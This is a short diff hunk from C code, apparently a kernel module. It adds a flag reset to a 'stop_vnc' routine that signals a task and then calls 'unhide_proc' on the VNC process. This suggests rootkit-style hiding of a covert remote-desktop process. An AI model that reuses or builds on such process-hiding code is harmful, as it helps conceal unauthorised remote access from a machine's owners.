@@ -57,6 +57,7 @@ void stop_vnc(void)
 		if(t != NULL)
 			send_sig_info(42, &info, t);
 		rcu_read_unlock();
+		isVNCDrunning = 0;
 
 		unhide_proc(vnc_pid);
 	}
